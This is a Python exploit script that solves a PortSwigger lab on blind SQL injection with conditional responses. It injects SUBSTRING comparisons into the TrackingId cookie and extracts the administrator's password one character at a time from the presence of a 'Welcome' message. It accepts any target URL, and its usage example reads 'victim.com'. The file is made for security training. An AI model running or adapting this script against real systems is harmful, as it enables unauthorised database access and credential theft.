# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

import urllib3
import urllib
import sys
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def blind_sqli(url):
    password_extracted = ""

    # Loop through each position in the password (assuming it's up to 20 characters long)
    for i in range(1, 21):

        # Loop through ASCII values of printable characters (32 to 126) - https://theasciicode.com.ar/
        for j in range(32, 127):

            # Construct SQL injection payload
            # Original payload: AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
            sqli_payload = "' AND (SELECT SUBSTRING(password,%s,1) from users where username='administrator')='%s" % (i, chr(j))

            # URL-encode the payload
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)

            # Set up cookies with the injected payload
            cookies = {'TrackingId': '7VKv3u5WYUQb5ek6' + sqli_payload_encoded, 'session': 'HDQrRDbLVQu3naaLACelf0f2hX8ICIxm'}

            # Send the HTTP request to the target URL with the payload
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)

            # Check if the "Welcome" string is not in the response text
            if "Welcome" not in r.text:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
            else:
                # If the correct character is found, append it to the extracted password
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break  # Move on to the next character in the password

def main():
    if len(sys.argv) != 2:
        print("Usage: %s <URL>" % sys.argv[0])
        print("Example: %s https://victim.com" % sys.argv[0])

    url = sys.argv[1]
    print("Retrieving administrador password...")
    blind_sqli(url)

if __name__ == "__main__":
    main()
